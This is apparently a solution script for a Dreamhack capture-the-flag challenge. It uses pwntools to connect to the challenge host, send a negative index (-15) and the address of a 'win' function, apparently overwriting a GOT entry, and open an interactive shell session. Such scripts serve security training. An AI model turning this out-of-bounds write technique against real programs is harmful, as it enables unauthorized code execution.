from pwn import *
#p = process('./prob')
p = remote('host3.dreamhack.games', 9185)
e = ELF('./prob')

printf_got = e.got['printf']
win = e.symbols['win']
buf = 0x404080
p_got = 0x404008
p.sendlineafter(b'val: ', str(-15).encode())
p.sendlineafter(b'val: ', str(win).encode())    
p.interactive()